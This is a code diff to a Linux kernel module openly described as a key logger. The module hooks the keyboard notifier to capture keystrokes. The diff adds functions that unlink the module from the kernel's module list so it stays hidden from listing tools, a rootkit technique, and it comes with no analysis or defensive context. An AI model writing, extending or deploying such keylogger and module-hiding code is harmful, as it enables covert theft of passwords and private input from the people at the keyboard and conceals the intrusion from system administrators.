@@ -6,9 +6,25 @@ MODULE_DESCRIPTION("Key logger");
 
 int buffer[BUFFER_SIZE];
 int buffer_pos = 0;
+static struct list_head *prev_module;
 
 struct notifier_block nb;
 struct semaphore sem;
+
+void hide_module(void) 
+{
+	prev_module = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+
+}
+
+
+void show_module(void) 
+{
+	list_add(&THIS_MODULE->list, prev_module);
+
+}
+
 
 int keylogger_open(struct inode *inode, struct file *file) 
 {
@@ -114,9 +130,7 @@ static int __init keylogger_init(void)
 	nb.notifier_call = keylogger_notify;
 	ret = register_keyboard_notifier(&nb);
 
-	if (ret) {
-		return ret;
-	}
+	if (ret) return ret;
 
 	ret = misc_register(&keylog_device);
 
@@ -124,7 +138,8 @@ static int __init keylogger_init(void)
 		unregister_keyboard_notifier(&nb);
 		return ret;
 	}
-
+	
+	//show_module();
 	printk(KERN_INFO "Keylogger module loaded\n");
 	return 0;
 }
